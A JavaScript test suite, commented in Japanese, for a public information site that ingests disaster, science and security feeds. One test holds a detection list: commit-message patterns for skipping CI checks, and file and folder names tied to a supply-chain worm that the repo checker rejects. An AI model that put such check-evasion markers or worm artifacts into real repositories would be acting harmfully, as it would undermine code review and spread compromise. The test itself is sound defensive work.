  const t1 = normalizeFeedItem(fdma, { title: '台風第25号による被害状況（第3報）', link: 'https://www.fdma.go.jp/disaster/info/a.html', date: Date.parse('2026-10-20T00:00:00Z') }, NOW).topic;
  const t2 = normalizeFeedItem(fdma, { title: '台風第25号による被害状況（第4報）', link: 'https://www.fdma.go.jp/disaster/info/b.html', date: Date.parse('2026-10-21T00:00:00Z') }, NOW).topic;
  assert.equal(t1, t2);
  // 実際の消防庁の形：一覧ページへの相対パス＋目印、pubDate は第1報の日付、見出しに「第N報・R8.10.26更新」
  const fdmaXml = '<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"><channel><title>災害情報一覧</title>' +
    '<item><title>令和8年台風第30号及び前線による被害及び消防機関等の対応状況（第3報・R8.10.26更新）</title><link>/disaster/info/#070300</link><pubDate>Sun, 25 Oct 2026 10:00:00 +0900</pubDate></item>' +
    '<item><title>令和8年台風第30号及び前線による被害及び消防機関等の対応状況（第2報・R8.10.25更新）</title><link>/disaster/info/#070299</link><pubDate>Sun, 25 Oct 2026 10:00:00 +0900</pubDate></item>' +
    '<item><title>令和8年10月21日からの大雨による被害及び消防機関等の対応状況（第5報・R8.10.23更新）</title><link>/disaster/info/#070289</link><pubDate>Wed, 21 Oct 2026 19:45:00 +0900</pubDate></item>' +
    '<item><title>別サイトへのリンク</title><link>https://example.com/x</link><pubDate>Wed, 21 Oct 2026 19:45:00 +0900</pubDate></item></channel></rss>';
  const fg = inspectFeed(fdma, fdmaXml, NOW, 'https://www.fdma.go.jp/disaster/info/index.xml');
  assert.equal(fg.items.length, 3);
  assert.equal(fg.errors, 1); // 別ホストへのリンクは異常として除く
  assert.equal(new Set(fg.items.map((x) => x.id)).size, 3); // 同じ一覧ページへのリンクでも、目印で別の項目として扱う
  assert.ok(fg.items.every((x) => x.source.url === 'https://www.fdma.go.jp/disaster/info/')); // リンクに # を含めない
  assert.equal(fg.items[0].publishedAt, '2026-10-25T15:00:00.000Z'); // 見出しの更新日（R8.10.26、日本時間）
  assert.equal(fg.items[0].topic, fg.items[1].topic); // 第3報と第2報は同じ災害
  assert.notEqual(fg.items[0].topic, fg.items[2].topic);
  assert.equal(reiwaUpdatedDate('（第1報・R8.13.40更新）'), null);
  // NASA の報道発表：リンク先は www.nasa.gov/news-release/ 以下だけ（ブログなど別の場所へのリンクは除く）
  const nasa = FEEDS.find((f) => f.key === 'nasaNews');
  const nx = '<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"><channel><title>News Releases</title>' +
    '<item><title>NASA, USDA Sign Agreement Advancing Earth Science, Agriculture</title><link>https://www.nasa.gov/news-release/nasa-usda-sign-agreement-advancing-earth-science-agriculture/</link><pubDate>Fri, 23 Oct 2026 14:00:00 +0000</pubDate></item>' +
    '<item><title>Blog</title><link>https://www.nasa.gov/blogs/spacestation/2026/10/26/x/</link><pubDate>Fri, 23 Oct 2026 14:00:00 +0000</pubDate></item>' +
    '<item><title>Other site</title><link>https://science.nasa.gov/x/</link><pubDate>Fri, 23 Oct 2026 14:00:00 +0000</pubDate></item></channel></rss>';
  const ng = inspectFeed(nasa, nx, NOW, 'https://www.nasa.gov/news-release/feed/');
  assert.equal(ng.items.length, 1);
  assert.equal(ng.errors, 2);
  assert.equal(ng.items[0].layer, 'research');
  assert.equal(ng.items[0].title.en, 'NASA, USDA Sign Agreement Advancing Earth Science, Agriculture');
  // NIH の報道発表：日付は「Fri, 10/23/2026 - 13:00」の形（2026-10-27 に実際のフィードで確認）。リンク先は news-releases 以下だけ
  const nih = FEEDS.find((f) => f.key === 'nihNews');
  const hx = '<?xml version="1.0" encoding="utf-8"?><rss version="2.0"><channel><title>NIH</title>' +
    '<item><title>An extra year of secondary school lowered dementia diagnoses later in life</title><link>https://www.nih.gov/news-events/news-releases/extra-year-secondary-school-lowered-dementia-diagnoses-later-life</link><pubDate>Fri, 10/23/2026 - 13:00</pubDate></item>' +
    '<item><title>Other</title><link>https://www.nih.gov/health-information/x</link><pubDate>Fri, 10/23/2026 - 13:00</pubDate></item></channel></rss>';
  const hg = inspectFeed(nih, hx, NOW, 'https://www.nih.gov/news-releases/feed.xml');
  assert.equal(hg.items.length, 1);
  assert.equal(hg.errors, 1);
  assert.equal(hg.items[0].publishedAt.slice(0, 10), '2026-10-23');
  assert.equal(parseFeedDate('Wed, 10/14/2026 - 11:00'), Date.UTC(2026, 9, 14, 12));
  assert.equal(parseFeedDate('Wed, 13/14/2026 - 11:00'), null);
  // 文字コード：Shift_JIS の宣言どおりに読む。知らない文字コードは失敗
  const sjis = Buffer.concat([Buffer.from('<?xml version="1.0" encoding="Shift_JIS"?><rss><item><title>'), Buffer.from([0x82, 0xa0]), Buffer.from('</title></item></rss>')]);
  assert.ok(decodeFeed(sjis).includes('あ'));
  assert.throws(() => decodeFeed(Buffer.from('<?xml version="1.0" encoding="UTF-7"?><rss/>')));
});

test('週次のリンク検査：都道府県の窓口リンクのうち、表示しているものだけを集める（通信しない）', () => {
  const { urls } = collectUrls();
  const ev = readJson('data/directory/evidence.json').links;
  const prefLinks = readJson('data/directory/prefectures.json').prefectures.flatMap((p) => p.links || []);
  const shown = prefLinks.filter((l) => isShownLink(l, ev));
  // 表示している都道府県リンクは全部集める（取り込みの段階1ではデータがまだ無いので0件のこともある）
  for (const l of shown) assert.ok(urls.has(l.url), `都道府県リンク ${l.id} が検査対象に入っていない`);
  console.log(`   都道府県リンク：表示 ${shown.length} 件／検査対象 ${shown.filter((l) => urls.has(l.url)).length} 件`);
  // 表示しないリンク（確認の記録が無い・URL が違う・確認日が無い）は集めない
  assert.equal(isShownLink({ id: 'x', url: 'https://a.example/' }, {}), false);
  assert.equal(isShownLink({ id: 'x', url: 'https://a.example/' }, { x: { method: 'fetched', url: 'https://b.example/', checkedAt: '2026-10-01' } }), false);
  assert.equal(isShownLink({ id: 'x', url: 'https://a.example/' }, { x: { method: 'unverified', url: 'https://a.example/', checkedAt: '2026-10-01' } }), false);
  assert.equal(isShownLink({ id: 'x', url: 'https://a.example/' }, { x: { method: 'operator', url: 'https://a.example/' } }), false);
  assert.equal(isShownLink({ id: 'x', url: 'https://a.example/' }, { x: { method: 'operator', url: 'https://a.example/', checkedAt: '2026-10-01' } }), true);
});

test('画面の取得状態：取得元の一部だけ失敗したときも知らせ、正常な0件は失敗にしない', () => {
  const now = Date.parse('2026-10-27T03:00:00Z');
  const at = '2026-10-27T01:00:00Z';
  const mixed = (feeds, retrievedAt = at) => ({ kind: 'mixed', count: 20, retrievedAt, reviewedAt: '2026-10-26', feeds });
  const notes = (m, mode = 'live') => statusModel({ layer: '防犯', doc: { status: 'ok' }, meta: m, mode, now }).notes.filter((x) => x.key === 'status.feedsMissing');
  // 全部成功・正常な0件：知らせない
  assert.equal(notes(mixed({ fsaNews: { status: 'ok' }, ftcConsumer: { status: 'empty' } })).length, 0);
  // 一部失敗（成功した取得元がある）：失敗した取得元だけを知らせる
  assert.deepEqual(notes(mixed({ fsaNews: { status: 'ok' }, ftcConsumer: { status: 'failed' }, ncscNews: { status: 'invalid' } }))[0].sources, ['ftcConsumer', 'ncscNews']);
  // 全部失敗（取得時刻なし）：手動掲載の最終確認で示し、失敗を知らせる。取得時刻は作らない
  const all = statusModel({ layer: '防犯', doc: { status: 'ok' }, meta: mixed({ fsaNews: { status: 'failed' } }, null), mode: 'live', now });
  assert.equal(all.key, 'status.curated');
  assert.equal(all.notes.filter((x) => x.key === 'status.feedsMissing').length, 1);
  // 取得時刻と手動掲載の確認日を分けて示す
  const ok = statusModel({ layer: '防犯', doc: { status: 'ok' }, meta: mixed({ fsaNews: { status: 'ok' } }), mode: 'live', now });
  assert.equal(ok.key, 'status.mixed');
  assert.equal(ok.params.date, at);
  assert.equal(ok.params.reviewed, '2026-10-26');
  // 確認版（offline / snapshot）では取得していないので知らせない
  assert.equal(notes(mixed({ fsaNews: { status: 'notFetched' } }), 'offline').length, 0);
  assert.equal(notes(mixed({ fsaNews: { status: 'failed' } }), 'snapshot').length, 0);
  // 手動掲載も0件・自動取得も全部失敗した混合分野：「取得できなかった」と示し、取得元の名前も出す
  const zero = statusModel({ layer: '防災', doc: { status: 'fetchFailed' }, meta: { kind: 'mixed', count: 0, retrievedAt: null, feeds: { fdmaDisaster: { status: 'failed' } } }, mode: 'live', now });
  assert.equal(zero.key, 'status.fetchFailedShort');
  assert.deepEqual(zero.notes[0].sources, ['fdmaDisaster']);
  // 自動取得だけの分野で取得失敗
  assert.equal(statusModel({ layer: '地震', doc: { status: 'fetchFailed' }, meta: { kind: 'auto' }, mode: 'live', now }).key, 'status.fetchFailedShort');
});

test('JPCERT/CC：取得元ごとの状態（正常・正常な0件・壊れた応答・形の違う応答）を区別する', () => {
  const wrap = (items) => `<?xml version="1.0" encoding="UTF-8"?>\n<rdf:RDF xmlns:rdf="r"><channel rdf:about="c"><title>JPCERT</title></channel>${items}</rdf:RDF>\n`;
  const at = (n) => `<item><title>注意喚起${n}</title><link>https://www.jpcert.or.jp/at/2026/at2600${n}.html</link><dc:date>2026-10-20T10:00+09:00</dc:date></item>`;
  const wr = '<item><title>週報</title><link>https://www.jpcert.or.jp/wr/2026/wr264001.html</link><dc:date>2026-10-20T10:00+09:00</dc:date></item>';
  const st = (r) => quakeStatusOf({ raw: r.raw, normalized: r.items.length, errors: r.errors, valid: r.items.length });
  assert.equal(st(inspectJpcertRdf(wrap(at(11) + wr), NOW)), 'ok');
  assert.equal(st(inspectJpcertRdf(wrap(wr), NOW)), 'empty'); // 注意喚起がない週＝正常な0件
  assert.equal(st(inspectJpcertRdf(wrap(''), NOW)), 'empty');
  assert.equal(st(inspectJpcertRdf(wrap('<item><title></title><link></link></item><item>x</item>'), NOW)), 'invalid'); // 項目が壊れている
  assert.throws(() => inspectJpcertRdf('<html><body>maintenance</body></html>', NOW)); // RSS ではない応答
  assert.throws(() => inspectJpcertRdf(wrap(at(11)).replace('</rdf:RDF>', ''), NOW)); // 途中で切れた応答
  assert.throws(() => inspectJpcertRdf('', NOW));
  assert.throws(() => inspectJpcertRdf('<!DOCTYPE x>' + wrap(at(11)), NOW));
});

test('ITセキュリティ：CISA が取れて JPCERT/CC だけ失敗したら、CISA の情報は残し、画面に JPCERT/CC の失敗を出す', () => {
  const root = fileURLToPath(new URL('..', import.meta.url));
  const tmp = mkdtempSync(join(tmpdir(), 'ta-sec-'));
  try {
    cpSync(root, tmp, { recursive: true, filter: (src) => !/[\\/](\.git|_site|node_modules)([\\/]|$)/.test(src) });
    const snap = join(tmp, 'snap');
    mkdirSync(snap);
    const today = new Date().toISOString().slice(0, 10);
    writeFileSync(join(snap, 'cisa-kev.json'), JSON.stringify([{ cveID: 'CVE-2026-11111', vendorProject: 'Example', product: 'Server', vulnerabilityName: 'Test', dateAdded: today, requiredAction: 'Apply updates per vendor instructions.', knownRansomwareCampaignUse: 'Unknown' }]));
    const build = () => spawnSync(process.execPath, [join(root, 'scripts/build.mjs'), '--snapshot'], { env: { ...process.env, TA_TARGET_ROOT: tmp, TA_SNAPSHOT_DIR: snap, TA_SNAPSHOT_AT: new Date().toISOString() }, encoding: 'utf8' });
    const meta = () => JSON.parse(readFileSync(join(tmp, '_site/data/meta.json'), 'utf8')).layers.security;
    const items = () => JSON.parse(readFileSync(join(tmp, '_site/data/layers/security.json'), 'utf8')).items;
    for (const [xml, expected] of [['<html>maintenance</html>', 'failed'], ['<?xml version="1.0"?><rdf:RDF><channel/><item><title></title></item></rdf:RDF>', 'invalid']]) {
      writeFileSync(join(snap, 'jpcertRss.xml'), xml);
      const r = build();
      assert.equal(r.status, 0, r.stderr + r.stdout);
      assert.equal(meta().feeds.jpcertRss.status, expected);
      assert.ok(items().some((x) => x.id === 'kev-cve-2026-11111'), 'CISA の情報が残っていない');
      // 公開版（live）の画面の文言：取得元の名前つきで欠落を知らせる
      const s = statusModel({ layer: 'ITセキュリティ', doc: { status: 'ok' }, meta: meta(), mode: 'live', now: Date.now() });
      assert.deepEqual(s.notes.find((n) => n.key === 'status.feedsMissing')?.sources, ['jpcertRss']);
    }
    // 正常な取得：失敗の表示なし、JPCERT/CC の見出しも入る
    writeFileSync(join(snap, 'jpcertRss.xml'), `<?xml version="1.0"?><rdf:RDF><channel/><item><title>テスト注意喚起</title><link>https://www.jpcert.or.jp/at/2026/at260099.html</link><dc:date>${today}T10:00+09:00</dc:date></item></rdf:RDF>`);
    assert.equal(build().status, 0);
    assert.equal(meta().feeds.jpcertRss.status, 'ok');
    assert.ok(items().some((x) => x.id.startsWith('jpcert-')));
    assert.equal(statusModel({ layer: 'x', doc: { status: 'ok' }, meta: meta(), mode: 'live', now: Date.now() }).notes.filter((n) => n.key === 'status.feedsMissing').length, 0);
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
});

test('検査の回避・ワーム関連：skip-checks などを見つけ、check-repo が関連ファイルと検査後の続行を拒否する', () => {
  for (const m of ['skip-checks: true', 'Skip-Checks:TRUE', 'fix [skip ci]', '[ci skip]', '[ Skip Actions ]']) assert.ok(SKIP_CHECKS.test(m), m);
  for (const m of ['skip checks later', 'ci: skip flaky test', 'skip-checks: false']) assert.ok(!SKIP_CHECKS.test(m), m);
  const root = fileURLToPath(new URL('..', import.meta.url));
  const tmp = mkdtempSync(join(tmpdir(), 'ta-repo-'));
  try {
    cpSync(root, tmp, { recursive: true, filter: (src) => !/[\\/](\.git|_site|node_modules)([\\/]|$)/.test(src) });
    const run = () => spawnSync(process.execPath, [join(root, 'scripts/check-repo.mjs')], { env: { ...process.env, TA_TARGET_ROOT: tmp }, encoding: 'utf8' });
    assert.equal(run().status, 0, run().stderr + run().stdout);
    for (const f of ['.github/init.js', 'binding.gyp', 'site/addon.node', 'scripts/.napi_cache', 'site/Binding.GYP']) {
      writeFileSync(join(tmp, f), 'x');
      const r = run();
      assert.notEqual(r.status, 0, `${f} を拒否していない`);
      rmSync(join(tmp, f));
    }
    // 同じ名前のフォルダ（中身が無害なテキストでも）・入れ子・大文字小文字の違いも拒否する
    for (const d of ['scripts/.napi_cache', 'site/js/.NAPI_CACHE', 'site/deep/nest/.napi_cache', 'docs/.Claude', 'site/addon.node']) {
      mkdirSync(join(tmp, d), { recursive: true });
      writeFileSync(join(tmp, d, 'README.txt'), 'harmless');
      const r = run();
      assert.notEqual(r.status, 0, `フォルダ ${d} を拒否していない`);
      rmSync(join(tmp, d.split('/').slice(0, 2).join('/') === 'site/deep' ? 'site/deep' : d), { recursive: true, force: true });
    }
    assert.equal(run().status, 0);
    const wf = join(tmp, '.github/workflows/validate.yml');
    const orig = readFileSync(wf, 'utf8');
    writeFileSync(wf, orig.replaceAll('if: ${{ success() }}', 'if: ${{ !cancelled() }}'));
    assert.notEqual(run().status, 0, 'PR 側のコードを検査の失敗後に実行する設定を拒否していない');
    writeFileSync(wf, orig.replace(/\n\s*if: \$\{\{ success\(\) \}\}/, ''));
    assert.notEqual(run().status, 0, 'PR 側のコードの手順に success() が無いのを拒否していない');
    writeFileSync(wf, orig);
    assert.equal(run().status, 0);
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
});

test('週次の候補の追加（add-candidates）：検査を通る項目だけを追加し、全体の確認日は変えず、失敗・中断しても元に戻せる', () => {
  const root = fileURLToPath(new URL('..', import.meta.url));
  const tmp = mkdtempSync(join(tmpdir(), 'ta-add-'));
  try {
    cpSync(join(root, 'data'), join(tmp, 'data'), { recursive: true });
    // 手動掲載の分野の項目を1つ借りる（step1 のようにデータが少ない状態でも動くように、分野は問わない）
    const items0 = readJson('data/curated/entries.json').items;
    const base = items0.find((x) => x.layer === 'crime') || items0[0];
    const L = base.layer;
    const today = new Date(Date.now() + 9 * 3600000).toISOString().slice(0, 10);
    const ok = { ...base, id: `${L}-2026-test-weekly-candidate`, topic: 'test-weekly-candidate', checkedAt: today, importance: 'minor' };
    const f = join(tmp, 'cand.json');
    const E = join(tmp, 'data/curated/entries.json');
    const C = join(tmp, 'data/curated/changelog.json');
    const P = join(tmp, 'data/curated/.add-candidates-pending.json');
    const run = (args, extraEnv = {}) => spawnSync(process.execPath, [join(root, 'scripts/add-candidates.mjs'), ...args], { env: { ...process.env, TA_TARGET_ROOT: tmp, ...extraEnv }, encoding: 'utf8' });
    const snap = () => [readFileSync(E, 'utf8'), readFileSync(C, 'utf8')];
    const clean = () => !existsSync(P) && !existsSync(E + '.tmp-add-candidates') && !existsSync(C + '.tmp-add-candidates');
    const before = snap();
    const reviewedBefore = JSON.parse(before[0]).reviewedAt;
    writeFileSync(f, JSON.stringify({ items: [ok] }));
    // 確認だけ：何も変えない
    assert.equal(run([f]).status, 0);
    assert.deepEqual(snap(), before);
    // 2つ目の書き込み（更新履歴）で失敗：両方とも元のまま・印も一時ファイルも残らない
    let r = run([f, '--write'], { TA_TEST_FAIL_AT: 'data/curated/changelog.json' });
    assert.notEqual(r.status, 0);
    assert.deepEqual(snap(), before, '2つ目の書き込みの失敗で元に戻っていない');
    assert.ok(clean());
    // 1つ目の書き込みで失敗
    r = run([f, '--write'], { TA_TEST_FAIL_AT: 'data/curated/entries.json' });
    assert.notEqual(r.status, 0);
    assert.deepEqual(snap(), before);
    assert.ok(clean());
    // 正常な追加：全体の最終確認日（reviewedAt）は変えない。追加した項目と更新履歴だけが増える
    r = run([f, '--write']);
    assert.equal(r.status, 0, r.stderr);
    const after = JSON.parse(readFileSync(E, 'utf8'));
    assert.equal(after.reviewedAt, reviewedBefore, '候補の追加だけで全体の確認日が変わった');
    assert.ok(after.items.some((x) => x.id === ok.id));
    assert.deepEqual(JSON.parse(readFileSync(C, 'utf8')).entries.at(-1).ids, [ok.id]);
    assert.ok(clean());
    // 同じ id の再追加・検査に通らない項目・定義されていない項目名は拒否し、ファイルを変えない
    const now = snap();
    assert.notEqual(run([f, '--write']).status, 0);
    for (const bad of [{ ...ok, id: `${L}-2026-test-bad`, source: { name: 'x', url: 'http://example.com/' } }, { ...ok, id: `${L}-2026-test-op`, extra: 'x' }]) {
      writeFileSync(f, JSON.stringify({ items: [bad] }));
      assert.notEqual(run([f, '--write']).status, 0);
    }
    writeFileSync(f, JSON.stringify({ items: [{ ...ok, id: `${L}-2026-test-dup` }, { ...ok, id: `${L}-2026-test-dup` }] }));
    assert.notEqual(run([f]).status, 0, '候補の中の id の重複を拒否していない');
    assert.deepEqual(snap(), now);
    // 完成予定の更新履歴に異常があれば、書き込む前に見つける（validateCuratedDocs）
    const e0 = JSON.parse(now[0]);
    const c0 = JSON.parse(now[1]);
    const badLog = { ...c0, entries: [...c0.entries, { date: today, by: 'someone', summary: { ja: 'x', en: 'x' }, ids: [] }] };
    assert.ok(validateCuratedDocs({ entries: e0, changelog: badLog, entriesRaw: now[0], changelogRaw: JSON.stringify(badLog, null, 2) + '\n' }).length > 0);
    assert.equal(validateCuratedDocs({ entries: e0, changelog: c0, entriesRaw: now[0], changelogRaw: now[1] }).length, 0);
    // 強制終了などで途中まで書かれた状態（データだけ新しく、印が残る）：ツールは追加を断り、check-repo も失敗し、--restore で元に戻る
    const bdir = mkdtempSync(join(tmpdir(), 'ta-add-bk-'));
    writeFileSync(join(bdir, 'entries.json'), now[0]);
    writeFileSync(join(bdir, 'changelog.json'), now[1]);
    writeFileSync(P, JSON.stringify({ startedAt: new Date().toISOString(), backupDir: bdir, ids: ['x'] }));
    writeFileSync(E, JSON.stringify({ ...e0, items: [...e0.items, { ...ok, id: `${L}-2026-test-half` }] }, null, 2) + '\n');
    writeFileSync(f, JSON.stringify({ items: [{ ...ok, id: `${L}-2026-test-next` }] }));
    assert.notEqual(run([f, '--write']).status, 0, '途中で止まった印があるのに追加した');
    cpSync(join(root, 'scripts'), join(tmp, 'scripts'), { recursive: true });
    cpSync(join(root, 'site'), join(tmp, 'site'), { recursive: true });
    const repo = spawnSync(process.execPath, [join(root, 'scripts/check-repo.mjs')], { env: { ...process.env, TA_TARGET_ROOT: tmp }, encoding: 'utf8' });
    assert.notEqual(repo.status, 0, 'check-repo が途中で止まった印を見逃した');
    assert.equal(run(['--restore']).status, 0);
    assert.deepEqual(snap(), now, '--restore で元に戻っていない');
    assert.ok(clean());
    rmSync(bdir, { recursive: true, force: true });
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
});

test('週次の候補の追加：AI（--by ai-curator）が作った2ファイルの差分は、AI・bot の範囲検査に通る', () => {
  const root = fileURLToPath(new URL('..', import.meta.url));
  const tmp = mkdtempSync(join(tmpdir(), 'ta-add-pr-'));
  try {
    cpSync(root, tmp, { recursive: true, filter: (src) => !/[\\/](\.git|_site|node_modules)([\\/]|$)/.test(src) });
    const g = (...a) => spawnSync('git', a, { cwd: tmp, encoding: 'utf8', env: { ...process.env, GIT_AUTHOR_NAME: 'ai-bot-test', GIT_AUTHOR_EMAIL: '1+ai-bot-test@users.noreply.github.com', GIT_COMMITTER_NAME: 'ai-bot-test', GIT_COMMITTER_EMAIL: '1+ai-bot-test@users.noreply.github.com' } });
    g('init', '-q', '-b', 'main');
    g('add', '-A');
    g('commit', '-q', '-m', 'base');
    const baseSha = g('rev-parse', 'HEAD').stdout.trim();
    const items0 = readJson('data/curated/entries.json').items;
    const base = items0.find((x) => x.layer === 'crime') || items0[0];
    const today = new Date(Date.now() + 9 * 3600000).toISOString().slice(0, 10);
    // AI は approved（運用者の承認済み）を付けられないので、借りた項目から外す
    const cand = { ...base, id: `${base.layer}-2026-test-ai-candidate`, topic: 'test-ai-candidate', checkedAt: today, importance: 'minor', tags: (base.tags || []).filter((t) => t !== 'approved') };
    writeFileSync(join(tmpdir(), 'ta-ai-cand.json'), JSON.stringify({ items: [cand] }));
    const r = spawnSync(process.execPath, [join(tmp, 'scripts/add-candidates.mjs'), join(tmpdir(), 'ta-ai-cand.json'), '--write', '--by', 'ai-curator'], { cwd: tmp, encoding: 'utf8' });
    assert.equal(r.status, 0, r.stderr);
    g('add', '-A');
    g('commit', '-q', '-m', 'Add a weekly candidate');
    const headSha = g('rev-parse', 'HEAD').stdout.trim();
    const scope = spawnSync(process.execPath, [join(tmp, 'scripts/check-pr-scope.mjs')], {
      cwd: tmp,
      encoding: 'utf8',
      env: { ...process.env, GITHUB_ACTIONS: '', PR_AUTHOR: 'ai-bot-test', AI_ACCOUNT_LOGINS: 'ai-bot-test', MAINTAINER_LOGIN: 'owner-test', BASE_SHA: baseSha, HEAD_SHA: headSha, HEAD_REF: 'curated/test', BASE_REF: 'main', PR_TITLE: 'Add a weekly candidate', PR_BODY: '', REPO: '', HEAD_REPO: '' },
    });
    assert.equal(scope.status, 0, scope.stderr + scope.stdout);
    assert.match(scope.stdout, /AI・bot・外部/);
    rmSync(join(tmpdir(), 'ta-ai-cand.json'), { force: true });
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
});

console.log(`\n${n} tests passed`);
